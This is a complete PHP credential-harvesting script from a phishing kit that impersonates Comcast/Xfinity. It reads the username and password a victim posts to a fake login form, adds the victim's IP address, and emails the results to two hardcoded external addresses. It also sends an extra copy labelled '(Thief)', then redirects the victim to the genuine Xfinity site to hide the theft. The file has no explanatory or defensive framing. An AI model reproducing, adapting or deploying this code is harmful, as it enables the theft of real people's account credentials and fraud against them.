<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Cyber Mail Spam ReZulT-----------------------\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Emp0w3r3d By Mr.H4-----------------------------\n";

$recipient = "jw9184467@gmail.com,bouthywire@yahoo.com";
$subject = "comcast- $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://xfinity.comcast.net/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>